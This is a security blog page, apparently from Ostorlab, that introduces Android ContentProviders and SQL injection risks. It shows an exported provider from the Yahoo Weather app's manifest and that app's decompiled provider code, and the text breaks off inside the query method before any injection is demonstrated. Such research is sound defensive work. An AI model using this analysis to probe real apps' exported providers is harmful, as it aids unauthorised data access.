@@ -1,0 +1,702 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
+    <link href="https://fastcdn.org/Animate.css/3.4.0/animate.min.css" rel="stylesheet">
+
+    <title>  Android, SQL and ContentProviders or Why SQL injections aren't dead yet ? | Autonomous Security
+</title>
+    <link rel="canonical" href="/android-sql-contentProvider-sql-injections.html">
+
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180">
+    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#333333">
+
+    <link rel="stylesheet" href="/theme/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pygments/default.min.css">
+    <link rel="stylesheet" href="/theme/css/theme.css">
+
+  
+  <meta name="description" content="Before we get into SQL injections and what might go wrong, we'll start by covering some technical information on Content Providers...">
+  <script>
+    (function(i, s, o, g, r, a, m) {
+      i['GoogleAnalyticsObject'] = r;
+      i[r] = i[r] || function() {
+        (i[r].q = i[r].q || []).push(arguments)
+      }, i[r].l = 1 * new Date();
+      a = s.createElement(o);
+      a.async = 1;
+      a.src = g;
+      m = s.getElementsByTagName(o)[0];
+      m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+    ga('create', 'UA-61939785-1', 'auto');
+    ga('send', 'pageview');
+  </script>
+
+
+</head>
+
+<body>
+<header class="navbar navbar-expand navbar-light flex-column flex-md-row bd-navbar">
+<div class="container">
+<a href="/" class="navbar-brand mr-0 mr-md-2 ">
+    <img class="img-fluid rounded" src=/static/img/Ostorlab.png width=90 height=90 alt="Autonomous Security">
+</a>
+<div class="navbar-nav-scroll">
+    <ul class="navbar-nav bd-navbar-nav flex-row">
+    </ul>
+</div>
+<ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+    <li class="nav-item"><a class="fa fa-github nav-link" href="https://github.com/Ostorlab" target="_blank"></a></li>
+    <li class="nav-item"><a class="fa fa-twitter nav-link" href="https://twitter.com/OstorlabSec" target="_blank"></a></li>
+</ul>
+<a class="btn btn-bd-scan d-none d-lg-inline-block mb-3 mb-md-0 ml-md-3" href="https://ostorlab.co/scan/mobile">Scan</a>
+</div></header>
+
+<div>
+    <div class='entry-colors'>
+        <div class='color_col_1'></div>
+        <div class='color_col_2'></div>
+        <div class='color_col_3'></div>
+    </div>
+    <section class="banner">
+        <div class="container">
+            <h1 class="title">Autonomous Security</h1>
+            <p>You just can't differentiate between a 🤖🤖🤖🤖🤖🤖🤖 and the very best of humans</p>
+        </div>
+    </section>
+    <div class="main">
+        <div class="container">
+            <h1>  Android, SQL and ContentProviders or Why SQL injections aren't dead yet ?
+</h1>
+            <hr>
+  <article class="article animated bounceInUp">
+    <header>
+      <ul class="list-inline">
+        <li class="list-inline-item text-muted" title="2016-11-03T07:27:00+01:00">
+          <i class="fa fa-calendar-o"></i>
+          Thu 03 November 2016
+        </li>
+        <li class="list-inline-item">
+          <i class="fa fa-hashtag"></i>
+          <a href="/category/mobile.html">Mobile</a>
+        </li>
+          <li class="list-inline-item">
+            <i class="fa fa-user-o"></i>
+              <a href="/author/ostorlab-team.html">Ostorlab Team</a>          </li>
+          <li class="list-inline-item">
+            <i class="fa fa-tags"></i>
+              <a href="/tag/android.html">android</a>,               <a href="/tag/sql-injection.html">sql injection</a>          </li>
+      </ul>
+    </header>
+    <div class="content">
+      <p>Before we get into SQL injections and what might go wrong, we'll start by covering some technical information on Content Providers.</p>
+<h2>I. ContentProvider</h2>
+<p>Content Providers are as the Android Developers explains it:</p>
+<blockquote class="blockquote">
+<p>"the standard interface that connects data in one process with code running in another process." (source http://developer.android.com/guide/topics/providers/content-providers.html).</p>
+</blockquote>
+<p>Basically content providers are standardized way to expose and access particular information in an application. For 
+instance if we take a real example, the Yahoo weather App for instance exposes the following Content Providers to 
+access location, weather forecast, etc (information extracted from the AndroidManifest.xml):</p>
+<p><img alt="alt text" class="img-fluid" src="/static/img/android_sql_contentprovider_sql_injections/sql_injection_content_provider.jpg" title="sql_injection_1"/></p>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">provider</span> <span class="n">android</span><span class="o">:</span><span class="n">authorities</span><span class="o">=</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span> 
+   <span class="n">android</span><span class="o">:</span><span class="n">exported</span><span class="o">=</span><span class="s">"true"</span> 
+   <span class="n">android</span><span class="o">:</span><span class="n">grantUriPermissions</span><span class="o">=</span><span class="s">"true"</span> 
+   <span class="n">android</span><span class="o">:</span><span class="n">label</span><span class="o">=</span><span class="s">"@7F08017B"</span> 
+   <span class="n">android</span><span class="o">:</span><span class="n">name</span><span class="o">=</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.WeatherProvider"</span> 
+    <span class="n">android</span><span class="o">:</span><span class="n">syncable</span><span class="o">=</span><span class="s">"true"</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">provider</span><span class="o">&gt;</span>
+</pre></div>
+<p>The most important attributes to check from a security standpoint are the 'authorities', 'exported', 'name' and 
+'permissions'. 'authority' is basically the URI to access that particular content provider. 'exported' indicates 
+if the content provider is exposed to other apps, the default behavior has changed before sdk version 16 as it was 
+true by default, hence it is highly recommended to explicitly state if your content provider should be exported or 
+not. 'name' indicates the class name implementing the ContentProvider.</p>
+<p>If we check the code of this Content Provider (decompiled):</p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">com.yahoo.mobile.client.android.weather.provider</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">WeatherProvider</span> <span class="kd">extends</span> <span class="n">android</span><span class="o">.</span><span class="na">content</span><span class="o">.</span><span class="na">ContentProvider</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">android</span><span class="o">.</span><span class="na">content</span><span class="o">.</span><span class="na">UriMatcher</span> <span class="n">a</span><span class="o">;</span>
+
+    <span class="kd">static</span> <span class="nf">WeatherProvider</span><span class="o">()</span>
+    <span class="o">{</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">android</span><span class="o">.</span><span class="na">content</span><span class="o">.</span><span class="na">UriMatcher</span><span class="o">(-</span><span class="mi">1</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$Locations</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">1</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$Locations</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">2</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$CurrentForecasts</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">3</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$CurrentForecasts</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">4</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$WeatherAlerts</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">5</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$WeatherAlerts</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">6</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$HourlyForecasts</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">7</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$HourlyForecasts</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">8</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$Images</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">9</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$DailyForecasts</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">10</span><span class="o">);</span>
+
+        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.yahoo.mobile.client.android.weather.provider.Weather"</span><span class="o">,</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherUriMatcher$DailyForecasts</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">1</span><span class="o">),</span> <span class="mi">11</span><span class="o">);</span>
+
+        <span class="k">return</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nf">WeatherProvider</span><span class="o">()</span>
+    <span class="o">{</span>
+        <span class="k">return</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">a</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p4</span><span class="o">,</span> <span class="kt">int</span> <span class="n">p5</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">v1</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">p4</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">NumberFormatException</span> <span class="n">v0_3</span><span class="o">;</span>
+            <span class="n">NumberFormatException</span> <span class="n">v0_0</span> <span class="o">=</span> <span class="n">p4</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Util</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v0_0</span><span class="o">))</span> <span class="o">{</span>
+                <span class="n">v0_3</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span>
+                    <span class="n">v0_3</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(((</span><span class="n">String</span><span class="o">)</span> <span class="n">v0_0</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">p5</span><span class="o">)));</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NumberFormatException</span> <span class="n">v0_4</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">a</span> <span class="o">&gt;</span> <span class="mi">6</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                        <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"WeatherProvider"</span><span class="o">,</span> <span class="s">"Unable to parse current forecast woeid: "</span><span class="o">,</span> <span class="n">v0_4</span><span class="o">);</span>
+                    <span class="o">}</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="n">v1</span> <span class="o">=</span> <span class="n">v0_3</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">v1</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">a</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p3</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="n">String</span> <span class="n">v0_0</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">p3</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">List</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">p3</span><span class="o">.</span><span class="na">getPathSegments</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(!</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Util</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">v1</span><span class="o">))</span> <span class="o">{</span>
+                <span class="n">v0_0</span> <span class="o">=</span> <span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">v1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
+
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">v0_0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">b</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p1</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">p1</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">int</span> <span class="nf">c</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p1</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">p1</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">delete</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p2</span><span class="o">,</span> <span class="n">String</span> <span class="n">p3</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">p4</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getType</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p2</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="nf">insert</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p2</span><span class="o">,</span> <span class="n">android</span><span class="o">.</span><span class="na">content</span><span class="o">.</span><span class="na">ContentValues</span> <span class="n">p3</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onCreate</span><span class="o">()</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="n">android</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">Cursor</span> <span class="nf">query</span><span class="o">(</span><span class="n">android</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">Uri</span> <span class="n">p8</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">p9</span><span class="o">,</span> <span class="n">String</span> <span class="n">p10</span><span class="o">,</span> <span class="n">String</span><span class="o">[]</span> <span class="n">p11</span><span class="o">,</span> <span class="n">String</span> <span class="n">p12</span><span class="o">)</span>
+    <span class="o">{</span>
+        <span class="n">android</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">Cursor</span> <span class="n">v0_0</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">a</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">share</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">Log</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="s">"WeatherProvider"</span><span class="o">,</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">().</span><span class="na">append</span><span class="o">(</span><span class="s">"Uri ["</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="n">p8</span><span class="o">.</span><span class="na">toString</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"]"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
+        <span class="o">}</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">android</span><span class="o">.</span><span class="na">content</span><span class="o">.</span><span class="na">ContentResolver</span> <span class="n">v1_4</span> <span class="o">=</span> <span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weathersdk</span><span class="o">.</span><span class="na">database</span><span class="o">.</span><span class="na">SQLiteWeather</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getContext</span><span class="o">()).</span><span class="na">getReadableDatabase</span><span class="o">();</span>
+            <span class="k">switch</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">yahoo</span><span class="o">.</span><span class="na">mobile</span><span class="o">.</span><span class="na">client</span><span class="o">.</span><span class="na">android</span><span class="o">.</span><span class="na">weather</span><span class="o">.</span><span class="na">provider</span><span class="o">.</span><span class="na">WeatherProvider</span><span class="o">.</span><span class="na">a</span><span class="o">.</span><span class="na">match</span><span class="o">(</span><span class="n">p8</span><span class="o">))</span> <span class="o">{</span>
+                <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
